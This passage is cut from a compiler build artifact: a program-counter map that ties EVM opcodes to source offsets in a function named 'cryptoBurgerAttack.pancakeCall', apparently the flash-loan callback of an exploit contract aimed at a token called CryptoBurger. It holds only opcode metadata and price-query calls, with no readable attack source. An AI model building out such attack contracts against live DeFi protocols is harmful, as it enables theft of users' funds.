    "5643": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5644": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "DUP1",
      "path": "0"
    },
    "5645": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "DUP4",
      "path": "0"
    },
    "5646": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "SUB",
      "path": "0"
    },
    "5647": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5648": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "DUP7",
      "path": "0"
    },
    "5649": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "GAS",
      "path": "0"
    },
    "5650": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "5651": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "5652": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "DUP1",
      "path": "0"
    },
    "5653": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "5654": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1623"
    },
    "5657": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "5658": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "5659": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5661": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "DUP1",
      "path": "0"
    },
    "5662": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "5663": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "5664": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5666": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "REVERT",
      "path": "0"
    },
    "5667": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5668": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "POP",
      "path": "0"
    },
    "5669": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "POP",
      "path": "0"
    },
    "5670": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "POP",
      "path": "0"
    },
    "5671": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "POP",
      "path": "0"
    },
    "5672": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "5674": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5675": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "5676": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5678": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "DUP3",
      "path": "0"
    },
    "5679": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "5680": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "5682": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "5683": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5684": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5685": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "ADD",
      "path": "0"
    },
    "5686": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "5688": {
      "op": "NOT"
    },
    "5689": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "AND",
      "path": "0"
    },
    "5690": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "DUP3",
      "path": "0"
    },
    "5691": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "ADD",
      "path": "0"
    },
    "5692": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "5694": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "5695": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x164B"
    },
    "5698": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "5699": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5700": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5701": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "ADD",
      "path": "0"
    },
    "5702": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5703": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "5706": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        7608,
        7715
      ],
      "op": "JUMP",
      "path": "0"
    },
    "5707": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5708": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7593,
        7715
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5709": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7593,
        7715
      ],
      "op": "POP",
      "path": "0"
    },
    "5710": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7725,
        7789
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 48,
      "value": "0x1681"
    },
    "5713": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5715": {
      "op": "DUP1"
    },
    "5716": {
      "op": "MLOAD"
    },
    "5717": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5719": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "5722": {
      "op": "DUP4"
    },
    "5723": {
      "op": "CODECOPY"
    },
    "5724": {
      "op": "DUP2"
    },
    "5725": {
      "op": "MLOAD"
    },
    "5726": {
      "op": "SWAP2"
    },
    "5727": {
      "op": "MSTORE"
    },
    "5728": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5730": {
      "op": "DUP1"
    },
    "5731": {
      "op": "MLOAD"
    },
    "5732": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5734": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "5737": {
      "op": "DUP4"
    },
    "5738": {
      "op": "CODECOPY"
    },
    "5739": {
      "op": "DUP2"
    },
    "5740": {
      "op": "MLOAD"
    },
    "5741": {
      "op": "SWAP2"
    },
    "5742": {
      "op": "MSTORE"
    },
    "5743": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7746,
        7758
      ],
      "op": "DUP4",
      "path": "0"
    },
    "5744": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7759,
        7760
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5746": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7746,
        7761
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5747": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7746,
        7761
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5748": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7746,
        7761
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5749": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7746,
        7761
      ],
      "op": "LT",
      "path": "0"
    },
    "5750": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7746,
        7761
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "5753": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7746,
        7761
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "5754": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7746,
        7761
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "5757": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7746,
        7761
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "5760": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        7746,
        7761
      ],
      "op": "JUMP",
      "path": "0"
    },
    "5761": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7725,
        7789
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5762": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 49,
      "value": "0x40"
    },
    "5764": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5765": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "5770": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "5772": {
      "op": "SHL"
    },
    "5773": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5774": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "5775": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5777": {
      "op": "DUP1"
    },
    "5778": {
      "op": "MLOAD"
    },
    "5779": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5781": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "5784": {
      "op": "DUP4"
    },
    "5785": {
      "op": "CODECOPY"
    },
    "5786": {
      "op": "DUP2"
    },
    "5787": {
      "op": "MLOAD"
    },
    "5788": {
      "op": "SWAP2"
    },
    "5789": {
      "op": "MSTORE"
    },
    "5790": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5791": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7864
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "5796": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7864
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5797": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x16B4"
    },
    "5800": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5801": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7878,
        7893
      ],
      "op": "DUP7",
      "path": "0"
    },
    "5802": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7878,
        7893
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5803": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7907,
        7911
      ],
      "op": "DUP7",
      "path": "0"
    },
    "5804": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7907,
        7911
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5805": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "5807": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "ADD",
      "path": "0"
    },
    "5808": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "5811": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        7814,
        7921
      ],
      "op": "JUMP",
      "path": "0"
    },
    "5812": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5813": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5815": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "5817": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5818": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "DUP1",
      "path": "0"
    },
    "5819": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "DUP4",
      "path": "0"
    },
    "5820": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "SUB",
      "path": "0"
    },
    "5821": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5822": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "DUP7",
      "path": "0"
    },
    "5823": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "GAS",
      "path": "0"
    },
    "5824": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "5825": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "5826": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "DUP1",
      "path": "0"
    },
    "5827": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "5828": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x16D1"
    },
    "5831": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "5832": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "5833": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5835": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "DUP1",
      "path": "0"
    },
    "5836": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "5837": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "5838": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5840": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "REVERT",
      "path": "0"
    },
    "5841": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5842": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "POP",
      "path": "0"
    },
    "5843": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "POP",
      "path": "0"
    },
    "5844": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "POP",
      "path": "0"
    },
    "5845": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "POP",
      "path": "0"
    },
    "5846": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "5848": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5849": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "5850": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5852": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "DUP3",
      "path": "0"
    },
    "5853": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "5854": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "5856": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "5857": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5858": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5859": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "ADD",
      "path": "0"
    },
    "5860": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "5862": {
      "op": "NOT"
    },
    "5863": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "AND",
      "path": "0"
    },
    "5864": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "DUP3",
      "path": "0"
    },
    "5865": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "ADD",
      "path": "0"
    },
    "5866": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "5868": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "5869": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x16F9"
    },
    "5872": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "5873": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5874": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5875": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "ADD",
      "path": "0"
    },
    "5876": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5877": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "5880": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        7814,
        7921
      ],
      "op": "JUMP",
      "path": "0"
    },
    "5881": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7814,
        7921
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5882": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7799,
        7921
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5883": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7799,
        7921
      ],
      "op": "POP",
      "path": "0"
    },
    "5884": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7931,
        7995
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 50,
      "value": "0x172F"
    },
    "5887": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5889": {
      "op": "DUP1"
    },
    "5890": {
      "op": "MLOAD"
    },
    "5891": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5893": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "5896": {
      "op": "DUP4"
    },
    "5897": {
      "op": "CODECOPY"
    },
    "5898": {
      "op": "DUP2"
    },
    "5899": {
      "op": "MLOAD"
    },
    "5900": {
      "op": "SWAP2"
    },
    "5901": {
      "op": "MSTORE"
    },
    "5902": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5904": {
      "op": "DUP1"
    },
    "5905": {
      "op": "MLOAD"
    },
    "5906": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5908": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "5911": {
      "op": "DUP4"
    },
    "5912": {
      "op": "CODECOPY"
    },
    "5913": {
      "op": "DUP2"
    },
    "5914": {
      "op": "MLOAD"
    },
    "5915": {
      "op": "SWAP2"
    },
    "5916": {
      "op": "MSTORE"
    },
    "5917": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7952,
        7964
      ],
      "op": "DUP4",
      "path": "0"
    },
    "5918": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7965,
        7966
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5920": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7952,
        7967
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5921": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7952,
        7967
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5922": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7952,
        7967
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5923": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7952,
        7967
      ],
      "op": "LT",
      "path": "0"
    },
    "5924": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7952,
        7967
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "5927": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7952,
        7967
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "5928": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7952,
        7967
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "5931": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7952,
        7967
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "5934": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        7952,
        7967
      ],
      "op": "JUMP",
      "path": "0"
    },
    "5935": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7931,
        7995
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5936": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 51,
      "value": "0x40"
    },
    "5938": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5939": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "5944": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "5946": {
      "op": "SHL"
    },
    "5947": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5948": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "5949": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5951": {
      "op": "DUP1"
    },
    "5952": {
      "op": "MLOAD"
    },
    "5953": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5955": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "5958": {
      "op": "DUP4"
    },
    "5959": {
      "op": "CODECOPY"
    },
    "5960": {
      "op": "DUP2"
    },
    "5961": {
      "op": "MLOAD"
    },
    "5962": {
      "op": "SWAP2"
    },
    "5963": {
      "op": "MSTORE"
    },
    "5964": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5965": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8070
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "5970": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8070
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5971": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1762"
    },
    "5974": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5975": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8084,
        8099
      ],
      "op": "DUP7",
      "path": "0"
    },
    "5976": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8084,
        8099
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5977": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8113,
        8117
      ],
      "op": "DUP7",
      "path": "0"
    },
    "5978": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8113,
        8117
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5979": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "5981": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "ADD",
      "path": "0"
    },
    "5982": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "5985": {
